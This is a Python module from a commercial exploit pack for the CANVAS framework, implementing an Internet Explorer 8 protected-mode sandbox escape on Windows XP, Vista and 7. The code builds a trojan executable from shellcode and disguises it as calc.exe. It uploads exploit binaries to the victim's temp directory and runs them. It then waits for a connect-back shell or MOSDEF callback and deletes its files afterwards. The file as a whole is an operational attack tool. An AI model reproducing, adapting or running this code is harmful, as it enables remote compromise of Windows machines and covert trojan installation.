
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

import canvasengine
from canvasexploit import canvasexploit
from exploitutils import *
import shellcode.standalone.windows.payloads as payloads
from shellcode import shellcodeGenerator
from MOSDEF import pelib

######################################################################################
NAME = "IE Sandbox Escape"
DESCRIPTION = "This module escapes from Internet Explorer protected mode."
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION["Date public"] = ""
DOCUMENTATION["References"] = ""
DOCUMENTATION["Repeatability"] = "Unlimited"   
DOCUMENTATION['VersionsAffected']='IE Version 8'
DOCUMENTATION["Notes"] = """
This module requires that Java is installed on the machine and that Internet Explorer is currently running at the time the module is executed.

A HTTPMOSDEF PLAIN/SSL connection is recommended for connections back to the main CANVAS node.
For connections back to the already compromised machines (NODE[1#]) we recommend the IE Inject or TCP ConnectBack.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "Vista", "7"]


NOTES="""
---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
---------------------------------------------------------------------
Usage:


Example:
Usage:
Win32/MOSDEF$ runmodule wp_ie_sandbox_escape
"""

PORT = 0
######################################################################################


# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Universal", (0x00000000), [WINALL]]
}


from engine.config import canvas_root_directory

import random

class theexploit(wp_exploit):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]              
    
    # local exploits default to HTTPMosdef PLAIN 
    DEFAULT_PAYLOAD = 3
    
    def __init__(self):
        wp_exploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.use_universal = True
        self.vProtect = True
        
        # We default these 
        self.HTTPMOSDEF = False
        self.useSSLMOSDEF = False        
        
        # This sets whether the local callback interface is used or not
        self.use_local_interface=False 
        
        self.node           = None
        self.local_path     = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_path    = '%TMP%\\' # remote base path
        self.trojan_name    = 'calc.exe'
        self.files          = ["escape.dll","escape.exe","exec.jar"]
        
    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        #self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()  
        
    def getArgs(self):
            
        # Selected shell options
        self.wp_getShellcodeType()
        
        self.host=self.target.interface
            
        self.node = self.argsDict['passednodes'][0]
        return                

    def init_exploit(self):
        """
        Uploads the files
        """
        for filename in self.files:
            src = os.path.join(self.local_path, filename)
            dst = os.path.join(self.remote_path, filename)
            try:
                self.node.shell.upload(src, destfilename = dst)
                self.log('WP> Uploaded %s to %s' % (src, dst))            
            except:
                import traceback
                traceback.print_exc(file=sys.stderr)
                self.log('WP> Could not upload %s to %s' % (src, dst))
                
        return True

    def uninit_exploit(self):
        """
        Remove the files
        """
        for filename in self.files:
            try:
                dst = os.path.join(self.remote_path, filename)
                ret = self.node.shell.unlink(dst)
                self.log('WP> %s' % ret)
            except:
                import traceback
                traceback.print_exc(file=sys.stderr)
                self.log('WP> Could not remove %s' % filename)

        try:
            dst = os.path.join(self.remote_path,self.trojan_name)
            ret = self.node.shell.unlink(dst)
            self.log('WP> %s' % ret)
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            self.log('WP> Could not remove %s' % filename)
            
        return True            

    def spawn_exploit(self):
        """
        spawn exploit
        """
        try:
            self.log('WP> Executing exploit file')
            dst = os.path.join(self.remote_path, "escape.exe")
            ret = self.node.shell.CreateProcessA(dst,inherithandles=1, dwCreationFlags = 0x00000200)
            self.log(ret)
            if not ret:
                return False
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def init_trojan(self):
        """
        Build + upload the trojan
        """

        trojan = ''
        try:
            
            myPElib = pelib.PElib()
            trojan = myPElib.createPEFileBuf(self.shellcode)

            # write out the binary
            src = os.path.join(self.local_path, self.trojan_name)
            self.log('WP> Creating trojan in %s' % src)
            fd = open(src, 'wb')
            fd.write(trojan)
            fd.close()
            
            # upload the binary
            self.log('WP> Uploading trojan ...')
            dst = os.path.join(self.remote_path, self.trojan_name)
            ret = self.node.shell.upload(src, destfilename = dst)
            self.log('WP> %s' % ret)
            os.unlink(src)
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def run(self):

        self.getArgs()

        if self.node.nodetype.lower() not in ['win32node', 'win64node']:
            self.log('WP> Node Type %s not supported ...'%self.node.nodetype)
            return False

        #ret, nodeos = self.node.shell.GetVersionEx()
        #minor, major = nodeos['Minor Version'], nodeos['Major Version']
        #if major < 6:
            #self.log('This exploit is only for Windows 2008/7/Vista')
            #return False

        ret,nodeos=self.node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('WP> Attacking Windows %d.%d'%(major,minor))

        self.remote_path = self.node.shell.GetTempPathA()
        if not self.remote_path:
            self.log('WP> Could not resolve full temp dir path ...')
            return False
        else:
            self.log('WP> Temp dir: %s' % self.remote_path)

        if self.node.shell.chdir(self.remote_path) < 0:
            self.log('WP> Could not chdir into %s' % self.remote_path)
            return False

        # build and upload callback trojan
        if self.init_trojan() == False:
            self.log('WP> Could not init trojan ...')
            return False

        # upload exploit files
        if self.init_exploit() == False:
            self.log('WP> Could not upload exploit files')
            return False

        # spawn exploit
        if self.spawn_exploit() == False:
            self.log('WP> Could not spawn exploit file ...')
            return False

        self.log('WP> Sleeping...')
        time.sleep(10)
        
        if self.ISucceeded()== False:
            self.log('WP> Waiting for callback...')
            time.sleep(10)

        ret = self.ISucceeded()
        # remove files ... can't remove trojan (active process)
        self.log('WP> Attempting to remove exploit files...')
        self.uninit_exploit()
        
        # check for callback success ...
        self.log('WP> Exploit complete...')
        
        return True

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)     
